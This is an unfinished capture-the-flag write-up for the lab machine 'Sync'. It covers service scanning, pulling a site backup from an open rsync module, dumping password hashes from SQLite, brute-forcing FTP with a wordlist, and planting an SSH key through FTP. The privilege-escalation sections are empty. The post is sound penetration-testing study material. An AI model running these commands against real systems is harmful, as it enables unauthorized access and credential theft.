---
title: "Vulnhub - Linux - Easy - Sync "
date: 2025-11-10 16:00:00 -0000
categories: [CTF]
tags: [linux, easy, rsync]
---

![Vulnlab Sync](/assets/img/ctf/vulnlab/easy/sync/sync.png))

# Initial Intel
* OS: Linux
* Difficulty: Easy

# tl;dr
<details><summary>Spoilers</summary>
</details>

# Attack Path

## Recon

### Service Enumeration

Standard TCP scan to start:

```bash
┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
└─$ nmap_tcp_full $sync
...
PORT    STATE SERVICE REASON         VERSION 
21/tcp  open  ftp     syn-ack ttl 63 vsftpd 3.0.5
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))  
    |_http-title: Login
873/tcp open  rsync   syn-ack ttl 63 (protocol version 31) 
```

Notable services:

#### 21/TCP - FTP

Does not allow anonympous login.

#### 22/TCP - SSH

Nothing to enumerate at the moment.

#### 80/TCP - Webserver

Login page:

![Web login page](/assets/img/ctf/vulnlab/easy/sync/1.png)

Tried enumerating webstack and web discovery:

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync]                                                      └─$ whatweb 10.10.95.76                                                                                     

ERROR Opening: https://10.10.95.76 - Connection refused - connect(2) for "10.10.95.76" port 443             
http://10.10.95.76 [200 OK] Apache[2.4.52], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.95.76], PasswordField[password], Script, Title[Login]
```

Nothing of value. 

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync]                                                      
└─$ feroxbuster --url http://$sync --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
```

No interesting directories or files.

#### 873/TCP - rsync

Looks to be rsync (which I don't have a lot of experience in at the moment).

I found this to reference pentesting rsync:

[Pentesting rsync](https://hackviser.com/tactics/pentesting/services/rsync)

![rsync banner grab](/assets/img/ctf/vulnlab/easy/sync/2.png)

```bash
┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
└─$ nc -nv $sync 873
(UNKNOWN) [10.10.95.76] 873 (rsync) open
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
```
rsync is running version 31.0

I enumerated a rsync module named *httpd*. NOTE: "web backup" is NOT another module. I spend a stupid amount of time believing it was and trying to list its contents to repeated faluire (main thought was the ' ' space was causing command issues...).

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync]
└─$ rsync $sync:: 
httpd           web backup  

Anyway, I got *httpd*'s contents listed:

┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync] 
└─$ rsync -av --list-only rsync://$sync/httpd
receiving incremental file list
drwxr-xr-x          4,096 2023/04/20 12:50:04 .
drwxr-xr-x          4,096 2023/04/20 13:13:22 db
-rw-r--r--         12,288 2023/04/20 12:50:42 db/site.db
drwxr-xr-x          4,096 2023/04/20 12:50:50 migrate
drwxr-xr-x          4,096 2023/04/20 13:13:15 www
-rw-r--r--          1,722 2023/04/20 13:02:54 www/dashboard.php
-rw-r--r--          2,315 2023/04/20 13:09:10 www/index.php
-rw-r--r--            101 2023/04/20 13:03:08 www/logout.php
```

Appears to be a copy of the website on :80. I referenced the article from earlier and downloaded the contents to my $attacker:

```bash
┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync] 
└─$ rsync -avz $sync::httpd attacker/
receiving incremental file list 
...
db/
db/site.db
migrate/
www/
www/dashboard.php
www/index.php
www/logout.php
```

![rysync copy](/assets/img/ctf/vulnlab/easy/sync/3.png)

![rysync copy](/assets/img/ctf/vulnlab/easy/sync/4.png)

![SQLite DB](/assets/img/ctf/vulnlab/easy/sync/5.png)

There's an SQLite DB in the material. 

```bash
┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync/attacker]  
└─$ file db/site.db 
db/site.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 3

┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync] 
└─$ sqlite3 attacker/db/site.db
SQLite version 3.42.0 2023-05-16 12:36:15
```

Listed the tables for the DB and selected all items available.


```bash
sqlite> .tables
users
sqlite> select * from users;
1|admin|7658a2741c9df3a97c819584db6e6b3c
2|triss|a0de4d7f81676c3ea9eabcadfd2536f6
sqlite> 
```

Retrieved two users, *admin* and *triss*, and their respective hashes.

I tried cracking the hashes with *john* and *hashcat* but they didn't crack the hash, even though I used *rockyou.txt* which worked for the bruteforce below:

```bash
┌──(haunter㉿kali)-[~/working/vulnlab/easy/sync]
└─$ nxc ftp $sync -u triss -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
...
FTP         10.10.95.76     21     10.10.95.76      [+] triss:gerald
```

Got *triss:gerald*

![Triss password cracked](/assets/img/ctf/vulnlab/easy/sync/6.png)

## Foothold

![Triss can't SSH](/assets/img/ctf/vulnlab/easy/sync/7.png)

![Triss webserver login](/assets/img/ctf/vulnlab/easy/sync/8.png)

```bash
ftp> ls -alh
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    2 1003     1003         4096 Nov 11 05:46 .
drwxr-x---    2 1003     1003         4096 Nov 11 05:46 ..
lrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Apr 19  2023 .bash_logout
-rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc
-rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile
-rw-------    1 1003     1003            5 Nov 11 05:46 test.txt

ftp> mkdir .ssh
257 "/.ssh" created

ftp> cd .ssh
250 Directory successfully changed

ftp> put authorized_key
...
226 Transfer complete. 
```

```bash
┌──(vEnv)(haunter㉿kali)-[~/working/vulnlab/easy/sync] 
└─$ ssh -i triss triss@$sync 
...
triss@ip-10-10-200-238:~$
```

```bash
triss@ip-10-10-200-238:~$ ls /home 
httpd  jennifer  sa  triss  ubuntu
```

## Lateral Movement / Privilege Escalation

```text
 /usr/bin/write.ul (Unknown SGID binary) 
```

## Root / SYSTEM

# Lessons Learned

<iframe style="width:100% !important;"  src="https://docs.google.com/spreadsheets/d/e/2PACX-1vTDFNm5WpGz8o9JSi4bYV5Rp34cSlnKC-pAJzThoQnm1pJsPQp2A_ez8BdokErrGYBt2bos8YAh9AsD/pubhtml?gid=219339819&amp;single=true&amp;widget=true&amp;headers=false"></iframe>

